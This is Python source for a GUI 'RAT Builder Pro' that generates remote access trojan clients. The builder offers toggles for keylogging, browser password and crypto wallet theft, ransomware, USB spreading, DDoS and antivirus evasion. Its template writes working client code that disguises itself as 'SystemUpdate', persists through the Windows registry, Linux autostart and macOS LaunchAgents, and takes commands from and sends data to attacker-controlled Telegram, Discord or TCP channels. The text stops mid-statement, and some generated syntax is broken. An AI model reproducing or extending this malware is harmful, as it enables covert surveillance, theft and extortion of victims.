import os
import sys
import json
import threading
import tempfile
import shutil
import subprocess
import platform
import socket
import uuid
import time
import base64
import hashlib
from pathlib import Path
from datetime import datetime
import zipfile
import tarfile
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *
import qdarkstyle
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

class ModernButton(QPushButton):
    def __init__(self, text, parent=None):
        super().__init__(text, parent)
        self.setMinimumHeight(40)
        self.setCursor(Qt.PointingHandCursor)
        
class TerminalWidget(QTextEdit):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setReadOnly(True)
        font = QFont("Consolas", 10)
        self.setFont(font)

class SplashScreen(QSplashScreen):
    def __init__(self):
        pixmap = QPixmap(600, 400)
        pixmap.fill(QColor(30, 30, 30))
        
        painter = QPainter(pixmap)
        painter.setPen(QColor(0, 255, 0))
        painter.setFont(QFont("Courier New", 24, QFont.Bold))
        painter.drawText(pixmap.rect(), Qt.AlignCenter, "RAT Builder Pro")
        
        painter.setFont(QFont("Courier New", 12))
        painter.drawText(0, 350, 600, 50, Qt.AlignCenter, "Cross-Platform Remote Administration Toolkit")
        painter.end()
        
        super().__init__(pixmap)
        
        self.progress_value = 0
        self.status_text = "Initializing..."
        
    def drawContents(self, painter):
        super().drawContents(painter)
        
        progress_bg = QRect(100, 320, 400, 20)
        painter.setPen(QColor(0, 255, 0))
        painter.drawRect(progress_bg)
        
        progress_width = int(400 * self.progress_value / 100)
        progress_fill = QRect(100, 320, progress_width, 20)
        painter.fillRect(progress_fill, QColor(0, 255, 0))
        
        painter.setPen(QColor(200, 200, 200))
        painter.setFont(QFont("Courier New", 10))
        painter.drawText(0, 290, 600, 20, Qt.AlignCenter, f"{self.status_text} {self.progress_value}%")
        
        painter.setPen(QColor(100, 100, 100))
        painter.setFont(QFont("Courier New", 8))
        painter.drawText(0, 370, 600, 20, Qt.AlignCenter, "Version 3.0 | Multi-Platform Support")
    
    def set_progress(self, value, status="Loading"):
        self.progress_value = value
        self.status_text = status
        self.repaint()

class CrossPlatformRATBuilder(QMainWindow):
    def __init__(self):
        super().__init__()
        self.temp_dir = tempfile.mkdtemp()
        self.config_file = "rat_builder_config.json"
        self.current_platform = platform.system().lower()
        self.encryption_key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.encryption_key)
        self.init_ui()
        self.load_config()
        
    def init_ui(self):
        self.setWindowTitle("RAT Builder Pro - Cross-Platform Security Tool")
        self.setGeometry(100, 100, 1600, 1000)
        
        self.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5() + """
            QMainWindow {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                    stop:0 #1e1e1e, stop:1 #2d2d2d);
            }
            QTabWidget::pane {
                border: 2px solid #444;
                background-color: #2d2d2d;
                border-radius: 8px;
            }
            QTabBar::tab {
                background-color: #3d3d3d;
                color: #ffffff;
                padding: 12px 24px;
                margin-right: 2px;
                border: 1px solid #555;
                border-bottom: none;
                border-top-left-radius: 8px;
                border-top-right-radius: 8px;
                font-weight: bold;
            }
            QTabBar::tab:selected {
                background-color: #00ff00;
                color: #000000;
                border-color: #00cc00;
            }
            QTabBar::tab:hover {
                background-color: #4d4d4d;
            }
            QGroupBox {
                color: #00ff00;
                font-weight: bold;
                font-size: 12px;
                border: 2px solid #555;
                border-radius: 8px;
                margin-top: 15px;
                padding-top: 15px;
                background-color: #2d2d2d;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 15px;
                padding: 0 10px 0 10px;
                background-color: #2d2d2d;
            }
            QTextEdit, QLineEdit, QComboBox, QSpinBox {
                background-color: #1a1a1a;
                color: #ffffff;
                border: 2px solid #555;
                border-radius: 6px;
                padding: 8px;
                font-family: 'Courier New';
                font-size: 11px;
            }
            QTextEdit:focus, QLineEdit:focus, QComboBox:focus {
                border-color: #00ff00;
            }
            QCheckBox {
                color: #ffffff;
                spacing: 8px;
                font-weight: bold;
            }
            QCheckBox::indicator {
                width: 18px;
                height: 18px;
                border-radius: 4px;
            }
            QCheckBox::indicator:unchecked {
                border: 2px solid #555;
                background-color: #2d2d2d;
            }
            QCheckBox::indicator:checked {
                border: 2px solid #00ff00;
                background-color: #00ff00;
            }
            QProgressBar {
                border: 2px solid #555;
                border-radius: 6px;
                text-align: center;
                color: white;
                background-color: #1a1a1a;
                height: 25px;
                font-weight: bold;
            }
            QProgressBar::chunk {
                background-color: qlineargradient(
                    x1:0, y1:0, x2:1, y2:0,
                    stop:0 #00ff00, stop:1 #00cc00
                );
                border-radius: 4px;
            }
        """)
        
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        
        header = QLabel("RAT Builder Pro - Cross-Platform")
        header.setAlignment(Qt.AlignCenter)
        header.setStyleSheet("""
            color: #00ff00;
            font-size: 24px;
            font-weight: bold;
            font-family: 'Courier New';
            padding: 15px;
            background-color: #2d2d2d;
            border-radius: 8px;
            margin: 5px;
        """)
        layout.addWidget(header)
        
        platform_info = QLabel(f"Target Platform: {platform.system()} {platform.release()}")
        platform_info.setAlignment(Qt.AlignCenter)
        platform_info.setStyleSheet("""
            color: #cccccc;
            font-size: 12px;
            font-family: 'Courier New';
            padding: 5px;
        """)
        layout.addWidget(platform_info)
        
        tabs = QTabWidget()
        layout.addWidget(tabs)
        
        tabs.addTab(self.create_config_tab(), "🔧 Configuration")
        tabs.addTab(self.create_features_tab(), "⚡ Features")
        tabs.addTab(self.create_advanced_tab(), "🔬 Advanced")
        tabs.addTab(self.create_build_tab(), "🏗️ Build")
        tabs.addTab(self.create_terminal_tab(), "💻 Terminal")
        
    def create_config_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        comm_group = QGroupBox("Communication Settings")
        comm_layout = QGridLayout(comm_group)
        
        comm_layout.addWidget(QLabel("Communication Method:"), 0, 0)
        self.comm_method = QComboBox()
        self.comm_method.addItems(["Telegram", "Discord", "HTTP Server", "Custom TCP"])
        self.comm_method.currentTextChanged.connect(self.on_comm_method_changed)
        comm_layout.addWidget(self.comm_method, 0, 1)
        
        self.telegram_frame = QWidget()
        telegram_layout = QGridLayout(self.telegram_frame)
        telegram_layout.addWidget(QLabel("Bot Token:"), 0, 0)
        self.bot_token = QLineEdit()
        self.bot_token.setPlaceholderText("1234567890:ABCdefGHIjklMNOpqrstUVWxyz123456")
        telegram_layout.addWidget(self.bot_token, 0, 1)
        
        telegram_layout.addWidget(QLabel("Trusted Users:"), 1, 0)
        self.trusted_users = QLineEdit()
        self.trusted_users.setPlaceholderText("123456789,987654321")
        telegram_layout.addWidget(self.trusted_users, 1, 1)
        
        telegram_layout.addWidget(QLabel("Trusted Chats:"), 2, 0)
        self.trusted_chats = QLineEdit()
        self.trusted_chats.setPlaceholderText("-1001234567890,-1009876543210")
        telegram_layout.addWidget(self.trusted_chats, 2, 1)
        comm_layout.addWidget(self.telegram_frame, 1, 0, 1, 2)
        
        self.discord_frame = QWidget()
        self.discord_frame.setVisible(False)
        discord_layout = QGridLayout(self.discord_frame)
        discord_layout.addWidget(QLabel("Webhook URL:"), 0, 0)
        self.discord_webhook = QLineEdit()
        self.discord_webhook.setPlaceholderText("https://discord.com/api/webhooks/...")
        discord_layout.addWidget(self.discord_webhook, 0, 1)
        comm_layout.addWidget(self.discord_frame, 1, 0, 1, 2)
        
        self.tcp_frame = QWidget()
        self.tcp_frame.setVisible(False)
        tcp_layout = QGridLayout(self.tcp_frame)
        tcp_layout.addWidget(QLabel("Server Host:"), 0, 0)
        self.server_host = QLineEdit()
        self.server_host.setPlaceholderText("127.0.0.1")
        tcp_layout.addWidget(self.server_host, 0, 1)
        
        tcp_layout.addWidget(QLabel("Server Port:"), 1, 0)
        self.server_port = QSpinBox()
        self.server_port.setRange(1, 65535)
        self.server_port.setValue(4444)
        tcp_layout.addWidget(self.server_port, 1, 1)
        comm_layout.addWidget(self.tcp_frame, 2, 0, 1, 2)
        
        conn_group = QGroupBox("Connection Settings")
        conn_layout = QGridLayout(conn_group)
        
        conn_layout.addWidget(QLabel("Check Interval (s):"), 0, 0)
        self.check_interval = QSpinBox()
        self.check_interval.setRange(5, 300)
        self.check_interval.setValue(10)
        conn_layout.addWidget(self.check_interval, 0, 1)
        
        conn_layout.addWidget(QLabel("Reconnect Delay (s):"), 1, 0)
        self.reconnect_delay = QSpinBox()
        self.reconnect_delay.setRange(5, 60)
        self.reconnect_delay.setValue(10)
        conn_layout.addWidget(self.reconnect_delay, 1, 1)
        
        layout.addWidget(conn_group)
        layout.addWidget(comm_group)
        
        platform_group = QGroupBox("Platform Configuration")
        platform_layout = QGridLayout(platform_group)
        
        platform_layout.addWidget(QLabel("Target OS:"), 0, 0)
        self.target_os = QComboBox()
        self.target_os.addItems(["Windows", "Linux", "macOS", "All"])
        platform_layout.addWidget(self.target_os, 0, 1)
        
        platform_layout.addWidget(QLabel("Architecture:"), 1, 0)
        self.architecture = QComboBox()
        self.architecture.addItems(["x64", "x86", "arm64", "universal"])
        platform_layout.addWidget(self.architecture, 1, 1)
        
        layout.addWidget(platform_group)
        
        persist_group = QGroupBox("Persistence & Stealth")
        persist_layout = QGridLayout(persist_group)
        
        self.auto_start = QCheckBox("Enable Auto-Start")
        self.auto_start.setChecked(True)
        persist_layout.addWidget(self.auto_start, 0, 0)
        
        self.hide_file = QCheckBox("Hide Files/Folders")
        self.hide_file.setChecked(True)
        persist_layout.addWidget(self.hide_file, 0, 1)
        
        self.anti_analysis = QCheckBox("Anti-Analysis Techniques")
        persist_layout.addWidget(self.anti_analysis, 1, 0)
        
        self.process_injection = QCheckBox("Process Injection (Windows)")
        persist_layout.addWidget(self.process_injection, 1, 1)
        
        self.mutex_check = QCheckBox("Mutex Check (Windows)")
        persist_layout.addWidget(self.mutex_check, 2, 0)
        
        self.registry_persistence = QCheckBox("Registry Persistence (Windows)")
        persist_layout.addWidget(self.registry_persistence, 2, 1)
        
        layout.addWidget(persist_group)
        
        layout.addStretch()
        return widget
        
    def on_comm_method_changed(self, method):
        self.telegram_frame.setVisible(method == "Telegram")
        self.discord_frame.setVisible(method == "Discord")
        self.tcp_frame.setVisible(method == "Custom TCP")
        
    def create_features_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        core_group = QGroupBox("Core Surveillance Features")
        core_layout = QGridLayout(core_group)
        
        features = [
            ("Keylogger", "feature_keylogger", True),
            ("Screenshot Capture", "feature_screenshot", True),
            ("File Manager", "feature_file_manager", True),
            ("Remote Shell", "feature_remote_shell", True),
            ("Process Manager", "feature_process_manager", True),
            ("Webcam Capture", "feature_webcam", False),
            ("Microphone Recording", "feature_microphone", False),
            ("Clipboard Monitoring", "feature_clipboard", True),
            ("Browser Password Extraction", "feature_browser_pass", False),
            ("Network Information", "feature_network_info", True),
            ("System Information", "feature_system_info", True),
            ("Installed Software", "feature_software_list", True),
        ]
        
        row, col = 0, 0
        for name, attr, default in features:
            checkbox = QCheckBox(name)
            checkbox.setChecked(default)
            setattr(self, attr, checkbox)
            core_layout.addWidget(checkbox, row, col)
            col += 1
            if col > 1:
                col = 0
                row += 1
                
        layout.addWidget(core_group)
        
        advanced_group = QGroupBox("Advanced Capabilities")
        advanced_layout = QGridLayout(advanced_group)
        
        advanced_features = [
            ("Block Input", "feature_block_input", True),
            ("Desktop Live Stream", "feature_live_stream", False),
            ("Persistence Manager", "feature_persistence_mgr", True),
            ("Reverse Proxy", "feature_reverse_proxy", False),
            ("Port Scanner", "feature_port_scanner", True),
            ("Network Sniffer", "feature_network_sniffer", False),
            ("Cryptocurrency Miner", "feature_miner", False),
            ("Ransomware Module", "feature_ransomware", False),
            ("DDoS Capability", "feature_ddos", False),
            ("USB Spreader", "feature_usb_spreader", False),
            ("Password Spray", "feature_password_spray", False),
            ("ARP Spoofing", "feature_arp_spoof", False),
        ]
        
        row, col = 0, 0
        for name, attr, default in advanced_features:
            checkbox = QCheckBox(name)
            checkbox.setChecked(default)
            setattr(self, attr, checkbox)
            advanced_layout.addWidget(checkbox, row, col)
            col += 1
            if col > 1:
                col = 0
                row += 1
                
        layout.addWidget(advanced_group)
        layout.addStretch()
        return widget
        
    def create_advanced_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        encryption_group = QGroupBox("Encryption & Security")
        encryption_layout = QGridLayout(encryption_group)
        
        encryption_layout.addWidget(QLabel("Communication Encryption:"), 0, 0)
        self.encryption_type = QComboBox()
        self.encryption_type.addItems(["AES-256", "ChaCha20", "RSA-2048", "None"])
        encryption_layout.addWidget(self.encryption_type, 0, 1)
        
        encryption_layout.addWidget(QLabel("Data Exfiltration:"), 1, 0)
        self.exfiltration_method = QComboBox()
        self.exfiltration_method.addItems(["Direct Upload", "Chunked Transfer", "Steganography", "DNS Tunneling"])
        encryption_layout.addWidget(self.exfiltration_method, 1, 1)
        
        layout.addWidget(encryption_group)
        
        evasion_group = QGroupBox("Evasion Techniques")
        evasion_layout = QGridLayout(evasion_group)
        
        self.evasion_vm = QCheckBox("VM Detection Bypass")
        evasion_layout.addWidget(self.evasion_vm, 0, 0)
        
        self.evasion_sandbox = QCheckBox("Sandbox Detection")
        evasion_layout.addWidget(self.evasion_sandbox, 0, 1)
        
        self.evasion_av = QCheckBox("Antivirus Evasion")
        evasion_layout.addWidget(self.evasion_av, 1, 0)
        
        self.evasion_debug = QCheckBox("Debugger Detection")
        evasion_layout.addWidget(self.evasion_debug, 1, 1)
        
        self.evasion_emulation = QCheckBox("Emulation Detection")
        evasion_layout.addWidget(self.evasion_emulation, 2, 0)
        
        layout.addWidget(evasion_group)
        
        custom_group = QGroupBox("Custom Command Modules")
        custom_layout = QVBoxLayout(custom_group)
        
        self.custom_commands = QTextEdit()
        self.custom_commands.setPlaceholderText(
            "Add custom commands here...\n"
            "Format: /command_name - Description\n"
            "Example:\n"
            "/bitcoin - Get Bitcoin wallet info\n"
            "/shutdown - Shutdown system\n"
            "/browser_history - Extract browser history"
        )
        self.custom_commands.setMaximumHeight(150)
        custom_layout.addWidget(self.custom_commands)
        
        layout.addWidget(custom_group)
        
        optimization_group = QGroupBox("Build Optimization")
        optimization_layout = QGridLayout(optimization_group)
        
        optimization_layout.addWidget(QLabel("Compression Level:"), 0, 0)
        self.compression_level = QComboBox()
        self.compression_level.addItems(["None", "Fast", "Standard", "Maximum"])
        optimization_layout.addWidget(self.compression_level, 0, 1)
        
        optimization_layout.addWidget(QLabel("Obfuscation:"), 1, 0)
        self.obfuscation_level = QComboBox()
        self.obfuscation_level.addItems(["None", "Basic", "Advanced", "Maximum"])
        optimization_layout.addWidget(self.obfuscation_level, 1, 1)
        
        layout.addWidget(optimization_group)
        layout.addStretch()
        return widget
        
    def create_build_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        build_group = QGroupBox("Build Configuration")
        build_layout = QGridLayout(build_group)
        
        build_layout.addWidget(QLabel("Output Name:"), 0, 0)
        self.output_name = QLineEdit()
        self.output_name.setText("SystemUpdate" + (".exe" if self.current_platform == "windows" else ""))
        build_layout.addWidget(self.output_name, 0, 1)
        
        build_layout.addWidget(QLabel("Output Directory:"), 1, 0)
        output_dir_layout = QHBoxLayout()
        self.output_dir = QLineEdit()
        self.output_dir.setText(str(Path.home() / "Desktop" / "RAT_Builds"))
        output_dir_layout.addWidget(self.output_dir)
        browse_btn = ModernButton("📁 Browse")
        browse_btn.clicked.connect(self.browse_output_dir)
        output_dir_layout.addWidget(browse_btn)
        build_layout.addLayout(output_dir_layout, 1, 1)
        
        build_layout.addWidget(QLabel("Python Version:"), 2, 0)
        self.python_version = QComboBox()
        self.python_version.addItems(["3.8", "3.9", "3.10", "3.11", "3.12"])
        self.python_version.setCurrentText("3.10")
        build_layout.addWidget(self.python_version, 2, 1)
        
        layout.addWidget(build_group)
        
        options_group = QGroupBox("Build Options")
        options_layout = QGridLayout(options_group)
        
        self.onefile = QCheckBox("Single Executable")
        self.onefile.setChecked(True)
        options_layout.addWidget(self.onefile, 0, 0)
        
        self.noconsole = QCheckBox("No Console Window")
        self.noconsole.setChecked(True)
        options_layout.addWidget(self.noconsole, 0, 1)
        
        self.upx_compress = QCheckBox("UPX Compression")
        self.upx_compress.setChecked(True)
        options_layout.addWidget(self.upx_compress, 1, 0)
        
        self.clean_build = QCheckBox("Clean Build Directory")
        self.clean_build.setChecked(True)
        options_layout.addWidget(self.clean_build, 1, 1)
        
        layout.addWidget(options_group)
        
        actions_group = QGroupBox("Build Actions")
        actions_layout = QHBoxLayout(actions_group)
        
        self.validate_btn = ModernButton("🔍 Validate Configuration")
        self.validate_btn.clicked.connect(self.validate_configuration)
        actions_layout.addWidget(self.validate_btn)
        
        self.build_btn = ModernButton("🏗️ Build Executable")
        self.build_btn.clicked.connect(self.build_executable)
        self.build_btn.setStyleSheet("background-color: #00aa00; color: white; font-weight: bold;")
        actions_layout.addWidget(self.build_btn)
        
        self.export_btn = ModernButton("💾 Save Configuration")
        self.export_btn.clicked.connect(self.save_config)
        actions_layout.addWidget(self.export_btn)
        
        layout.addWidget(actions_group)
        
        progress_group = QGroupBox("Build Progress")
        progress_layout = QVBoxLayout(progress_group)
        
        self.build_progress = QProgressBar()
        progress_layout.addWidget(self.build_progress)
        
        self.build_status = QLabel("Ready to build...")
        self.build_status.setStyleSheet("color: #00ff00; font-weight: bold;")
        progress_layout.addWidget(self.build_status)
        
        self.build_log = QTextEdit()
        self.build_log.setMaximumHeight(150)
        self.build_log.setStyleSheet("font-family: 'Courier New'; font-size: 10px;")
        progress_layout.addWidget(self.build_log)
        
        layout.addWidget(progress_group)
        layout.addStretch()
        return widget
        
    def create_terminal_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        terminal_header = QLabel("Build Terminal - Real-time Output")
        terminal_header.setStyleSheet("""
            color: #00ff00;
            font-weight: bold;
            font-size: 14px;
            padding: 10px;
            background-color: #2d2d2d;
            border-radius: 5px;
        """)
        layout.addWidget(terminal_header)
        
        self.terminal = TerminalWidget()
        layout.addWidget(self.terminal)
        
        self.log_message("🚀 RAT Builder Pro Terminal Initialized")
        self.log_message(f"📋 Platform: {platform.system()} {platform.release()}")
        self.log_message(f"🐍 Python: {sys.version.split()[0]}")
        self.log_message("✅ Ready for configuration and building")
        
        return widget
        
    def browse_output_dir(self):
        directory = QFileDialog.getExistingDirectory(self, "Select Output Directory", str(Path.home()))
        if directory:
            self.output_dir.setText(directory)
            
    def log_message(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.terminal.append(f"[{timestamp}] {message}")
        QApplication.processEvents()
        
    def log_build(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.build_log.append(f"[{timestamp}] {message}")
        QApplication.processEvents()
        
    def validate_configuration(self):
        self.log_message("🔍 Validating configuration...")
        
        errors = []
        
        if self.comm_method.currentText() == "Telegram" and not self.bot_token.text().strip():
            errors.append("Bot token is required for Telegram communication")
            
        if self.comm_method.currentText() == "Discord" and not self.discord_webhook.text().strip():
            errors.append("Webhook URL is required for Discord communication")
            
        if not self.trusted_users.text().strip():
            errors.append("At least one trusted user ID is required")
            
        if self.feature_webcam.isChecked() and self.current_platform == "linux":
            self.log_message("⚠️ Webcam feature may require additional dependencies on Linux")
            
        if errors:
            for error in errors:
                self.log_message(f"❌ {error}")
            QMessageBox.warning(self, "Validation Errors", "\n".join(errors))
            return False
            
        self.log_message("✅ Configuration validation passed!")
        return True

    def generate_cross_platform_rat(self):
        trusted_users_str = self.trusted_users.text().strip()
        trusted_chats_str = self.trusted_chats.text().strip()
        
        code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Cross-Platform RAT Client
Generated by RAT Builder Pro
Platform: {self.target_os.currentText()}
Timestamp: {datetime.now().isoformat()}
"""

import os
import sys
import time
import json
import shutil
import threading
import subprocess
import platform
import socket
import getpass
import uuid
import base64
import hashlib
import struct
import ctypes
from pathlib import Path
from datetime import datetime

# Platform-specific imports
{self.get_platform_specific_imports()}

# Feature imports
{self.get_feature_imports()}

class CrossPlatformRAT:
    def __init__(self):
        self.config = {{
            'bot_token': '{self.bot_token.text().strip()}',
            'trusted_users': [{trusted_users_str}],
            'trusted_chats': [{trusted_chats_str}],
            'platform': platform.system().lower(),
            'check_interval': {self.check_interval.value()},
            'reconnect_delay': {self.reconnect_delay.value()}
        }}
        self.session_id = str(uuid.uuid4())
        self.keylogger_active = False
        self.keylogger_file = "system_log.txt"
        self.command_handlers = self.setup_command_handlers()
        
        # Initialize platform-specific components
        self.setup_platform_specific()
        
        # Start main loop
        self.main_loop()
    
    def setup_platform_specific(self):
        """Setup platform-specific configurations"""
        current_platform = platform.system().lower()
        
        if current_platform == "windows":
            self.setup_windows()
        elif current_platform == "linux":
            self.setup_linux()
        elif current_platform == "darwin":
            self.setup_macos()
    
    def setup_windows(self):
        """Windows-specific setup"""
        try:
            import winreg
            import win32api
            import winshell
            
            if {str(self.auto_start.isChecked()).lower()}:
                self.setup_autostart_windows()
                
            if {str(self.mutex_check).lower()}:
                self.create_mutex()
                
        except ImportError as e:
            print(f"Windows imports not available: {{e}}")
    
    def setup_linux(self):
        """Linux-specific setup"""
        try:
            if {str(self.auto_start.isChecked()).lower()}:
                self.setup_autostart_linux()
        except Exception as e:
            print(f"Linux setup error: {{e}}")
    
    def setup_macos(self):
        """macOS-specific setup"""
        try:
            if {str(self.auto_start.isChecked()).lower()}:
                self.setup_autostart_macos()
        except Exception as e:
            print(f"macOS setup error: {{e}}")
    
    def setup_autostart_windows(self):
        """Windows autostart setup"""
        try:
            import winreg
            import win32api
            
            app_path = os.path.abspath(sys.argv[0])
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "SystemUpdate", 0, winreg.REG_SZ, app_path)
                
        except Exception as e:
            print(f"Autostart setup failed: {{e}}")
    
    def setup_autostart_linux(self):
        """Linux autostart setup"""
        try:
            autostart_dir = Path.home() / ".config" / "autostart"
            autostart_dir.mkdir(parents=True, exist_ok=True)
            
            desktop_file = autostart_dir / "system-update.desktop"
            app_path = os.path.abspath(sys.argv[0])
            
            desktop_content = f"""[Desktop Entry]
Type=Application
Name=System Update
Exec={{app_path}}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
            desktop_file.write_text(desktop_content)
            os.chmod(str(desktop_file), 0o755)
            
        except Exception as e:
            print(f"Linux autostart failed: {{e}}")
    
    def setup_autostart_macos(self):
        """macOS autostart setup"""
        try:
            launch_agents_dir = Path.home() / "Library" / "LaunchAgents"
            launch_agents_dir.mkdir(parents=True, exist_ok=True)
            
            plist_file = launch_agents_dir / "com.system.update.plist"
            app_path = os.path.abspath(sys.argv[0])
            
            plist_content = f```
            <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{{app_path}}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>```
            plist_file.write_text(plist_content)
            
        except Exception as e:
            print(f"macOS autostart failed: {{e}}")
    
    def create_mutex(self):
        """Create mutex to prevent multiple instances"""
        try:
            import win32event
            import win32api
            import winerror
            
            mutex_name = f"Global\\\\\\\\{{self.session_id}}"
            self.mutex = win32event.CreateMutex(None, False, mutex_name)
            if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
                sys.exit(0)
        except:
            pass
    
    def send_message(self, message):
        """Send message via configured communication method"""
        try:
            comm_method = "{self.comm_method.currentText()}"
            
            if comm_method == "Telegram":
                self.send_telegram(message)
            elif comm_method == "Discord":
                self.send_discord(message)
            elif comm_method == "Custom TCP":
                self.send_tcp(message)
            else:
                print(f"Message: {{message}}")
                
        except Exception as e:
            print(f"Send message failed: {{e}}")
    
    def send_telegram(self, message):
        """Send message via Telegram"""
        try:
            import telepot
            bot = telepot.Bot(self.config['bot_token'])
            
            for user_id in self.config['trusted_users']:
                try:
                    bot.sendMessage(user_id, message)
                except:
                    pass
                    
            for chat_id in self.config['trusted_chats']:
                try:
                    bot.sendMessage(chat_id, message)
                except:
                    pass
                    
        except Exception as e:
            print(f"Telegram send failed: {{e}}")
    
    def send_discord(self, message):
        """Send message via Discord webhook"""
        try:
            import requests
            webhook_url = "{self.discord_webhook.text().strip()}"
            
            payload = {{
                "content": message,
                "username": "System Monitor"
            }}
            
            requests.post(webhook_url, json=payload)
            
        except Exception as e:
            print(f"Discord send failed: {{e}}")
    
    def send_tcp(self, message):
        """Send message via TCP"""
        try:
            host = "{self.server_host.text().strip()}"
            port = {self.server_port.value()}
            
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((host, port))
                s.sendall(message.encode())
                
        except Exception as e:
            print(f"TCP send failed: {{e}}")
    
    def setup_command_handlers(self):
        """Setup command handlers dictionary"""
        handlers = {{
            'help': self.show_help,
            'system_info': self.get_system_info,
            'process_list': self.get_process_list,
            'file_list': self.list_files,
            'download': self.download_file,
            'upload': self.upload_file,
            'screenshot': self.take_screenshot,
            'keylogger_start': self.start_keylogger,
            'keylogger_stop': self.stop_keylogger,
            'keylogger_dump': self.dump_keylogger,
            'webcam_capture': self.capture_webcam,
            'microphone_record': self.record_microphone,
            'clipboard_get': self.get_clipboard,
            'clipboard_set': self.set_clipboard,
            'browser_passwords': self.extract_browser_passwords,
            'network_info': self.get_network_info,
            'installed_software': self.get_installed_software,
            'shell_exec': self.execute_shell,
            'block_input': self.block_input,
            'unblock_input': self.unblock_input,
            'persistence_add': self.add_persistence,
            'persistence_remove': self.remove_persistence,
            'reverse_proxy': self.start_reverse_proxy,
            'port_scan': self.port_scan,
            'network_sniff': self.network_sniff,
            'miner_start': self.start_miner,
            'miner_stop': self.stop_miner,
            'usb_spread': self.spread_usb,
            'password_spray': self.password_spray_attack,
            'arp_spoof': self.arp_spoof,
            'ddos_start': self.start_ddos,
            'ddos_stop': self.stop_ddos,
            'elevate_privileges': self.elevate_privileges,
            'disable_defender': self.disable_defender,
            'clear_logs': self.clear_logs,
            'get_wifi': self.get_wifi_passwords,
            'get_bitcoin': self.get_bitcoin_wallets,
            'browser_history': self.get_browser_history,
            'shutdown': self.shutdown_system,
            'restart': self.restart_system,
            'logoff': self.logoff_system,
            'message_box': self.show_message_box,
            'beep': self.play_beep,
            'wallpaper': self.change_wallpaper,
            'web_search': self.web_search,
            'geo_location': self.get_geolocation,
            'ransomware_encrypt': self.ransomware_encrypt,
            'ransomware_decrypt': self.ransomware_decrypt,
        }}
        
        # Add custom commands
        {self.generate_custom_command_handlers()}
        
        return handlers
    
    {self.generate_all_command_methods()}
    
    def check_commands(self):
        """Check for incoming commands"""
        try:
            # Implementation depends on communication method
            if "{self.comm_method.currentText()}" == "Telegram":
                self.check_telegram_commands()
            elif "{self.comm_method.currentText()}" == "Discord":
                self.check_discord_commands()
            elif "{self.comm_method.currentText()}" == "Custom TCP":
                self.check_tcp_commands()
                
        except Exception as e:
            print(f"Command check error: {{e}}")
    
    def check_telegram_commands(self):
        """Check Telegram for commands"""
        try:
            import telepot
            bot = telepot.Bot(self.config['bot_token'])
            
            # Get updates
            updates = bot.getUpdates(offset=self.last_update_id + 1 if hasattr(self, 'last_update_id') else 0)
            
            for update in updates:
                if 'message' in update:
                    message = update['message']
                    chat_id = message['chat']['id']
                    text = message.get('text', '')
                    
                    if str(chat_id) in [str(u) for u in self.config['trusted_users'] + self.config['trusted_chats']]:
                        self.process_command(text)
                    
                    self.last_update_id = update['update_id']
                    
        except Exception as e:
            print(f"Telegram command check failed: {{e}}")
    
    def check_discord_commands(self):
        """Check Discord for commands"""
        # Discord command checking would require a bot with message intent
        pass
    
    def check_tcp_commands(self):
        """Check TCP socket for commands"""
        try:
            host = "{self.server_host.text().strip()}"
            port = {self.server_port.value()}
            
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                try:
                    s.connect((host, port))
                    command = s.recv(4096).decode().strip()
                    if command:
                        self.process_command(command)
                except socket.timeout:
                    pass
                    
        except Exception as e:
            print(f"TCP command check failed: {{e}}")
    
    def process_command(self, command_text):
        """Process incoming command"""
        try:
            parts = command_text.split()
            if not parts:
                return
                
            cmd = parts[0].lower()
            args = parts[1:] if len(parts) > 1 else []
            
            if cmd in self.command_handlers:
                result = self.command_handlers[cmd](args)
                if result:
                    self.send_message(str(result))
            else:
                self.send_message(f"Unknown command: {{cmd}}")
                
        except Exception as e:
            self.send_message(f"Command processing error: {{e}}")
    
    def main_loop(self):
        """Main RAT loop"""
        self.send_message(f"🤖 RAT Started on {{platform.system()}} - Session: {{self.session_id}}")
        
        while True:
            try:
                # Check for commands and perform tasks
                self.check_commands()
                
                # Perform periodic tasks
                self.periodic_tasks()
                
                time.sleep(self.config['check_interval'])
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"Main loop error: {{e}}")
                time.sleep(self.config['reconnect_delay'])

    def periodic_tasks(self):
        """Perform periodic background tasks"""
        # Auto-exfiltrate keylogger data
        if self.keylogger_active:
            self.auto_exfiltrate_keylogs()
        
        # Check for new USB devices
        if {str(self.feature_usb_spreader.isChecked()).lower()}:
            self.check_usb_devices()

if __name__ == '__main__':
    # Anti-analysis checks
    if {str(self.evasion_vm.isChecked()).lower()}:
        if CrossPlatformRAT.is_vm_detected():
            sys.exit(0)
    
